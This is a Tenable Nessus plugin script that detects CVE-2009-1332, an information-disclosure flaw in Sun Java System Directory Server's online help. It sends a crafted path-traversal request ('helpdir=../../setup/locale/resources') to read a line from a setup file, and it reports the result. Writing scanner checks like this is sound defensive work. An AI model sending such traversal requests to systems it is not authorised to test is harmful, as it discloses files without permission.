#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");

if (description)
{
  script_id(39314);
  script_version("$Revision: 1.12 $");
  script_cvs_date("$Date: 2016/05/13 15:33:30 $");

  script_cve_id("CVE-2009-1332");
  script_bugtraq_id(34548);
  script_osvdb_id(53800);
  script_xref(name:"Secunia", value:"34751");

  script_name(english:"Sun Java System Directory Server Online Help Feature Information Disclosure");
  script_summary(english:"Tries to read a line from DSSetupResources.properties");

  script_set_attribute(attribute:"synopsis", value:
"The remote web server is running a web application that is affected
by an information disclosure vulnerability." );
  script_set_attribute(attribute:"description", value:
"Sun Java System Directory Server is running on the remote web server. 
The hosted version is affected by an information disclosure
vulnerability.  By sending a specially crafted request to the online
help feature, it is possible for a remote attacker to determine if
certain files exist, and in some cases retrieve a single line from
files." );
  script_set_attribute(attribute:"see_also", value:"http://download.oracle.com/sunalerts/1020302.1.html" );
  script_set_attribute(attribute:"solution", value:
"Either disable the online help or upgrade to Sun Java System Directory
Server Enterprise Edition 6.0 or later as discussed in the vendor's
advisory. " );
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_set_cvss_temporal_vector("CVSS2#E:ND/RL:OF/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"No known exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"false");

  script_set_attribute(attribute:"patch_publication_date", value: "2009/04/15");
  script_set_attribute(attribute:"plugin_publication_date", value: "2009/06/04");
  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();


  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2009-2016 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}

include("global_settings.inc");
include("misc_func.inc");
include("http.inc");


port = get_http_port(default:80, embedded: 0);

# Test an install.
helpdir = "../../setup/locale/resources";   # directory relative to, say, 'manual/en'
mapfile = "DSSetupResources.properties";    # file located in helpdir
token = "Frame-Title-Text";                 # 'key' in a line in mapfile
                                            # nb: line have key and value separated by an equals sign.

url = string(
  "/manual/help/help?",
  "helpdir=", helpdir, "&",
  "token=", token, "&",
  "mapfile=", mapfile, "&",
  "debug=1"
);
 
res = http_send_recv3(method:"GET", item:url, port:port);
if (isnull(res)) exit(0);

if (
  string("Product: ", helpdir) >< res[2] && 
  string(helpdir, "/", mapfile) >< res[2] &&
  (
    "CreateFile successfully opened file: " >< res[2] ||
    "Failed to open map file: " >< res[2]
  )
)
{
  if (report_verbosity > 0)
  {
    if ("CreateFile successfully opened file: " >< res[2])
    {
      report = string(
        "Nessus was able to exploit the issue to retrieve a line from the file\n",
        "'manual/en/", helpdir, "/", mapfile, "'\n",
        "using the following URL :\n",
        "\n",
        "  ", build_url(port:port, qs:url), "\n"
      );
      if (report_verbosity > 1 && "Reason :</b> unable to open file: " >< res[2])
      {
        contents = strstr(res[2], "Reason :</b> unable to open file: ");
        contents = strstr(contents, string(helpdir, "/")) - string(helpdir, "/");
        contents = contents - strstr(contents, "<br>");
        
        report += string(
          "\n",
          "Here are contents of the line starting with '", token, "' :\n",
          "\n",
          crap(data:"-", length:30), " snip ", crap(data:"-", length:30), "\n",
          contents, "\n",
          crap(data:"-", length:30), " snip ", crap(data:"-", length:30), "\n"
        );
      }
    }
    else 
    {
      report = string(
        "\n",
        "Nessus was able to verify the issue exists using the following \n",
        "URL :\n",
        "\n",
        "  ", build_url(port:port, qs:url), "\n"
      );
    }
    security_warning(port:port, extra:report);
  }
  else security_warning(port);
}
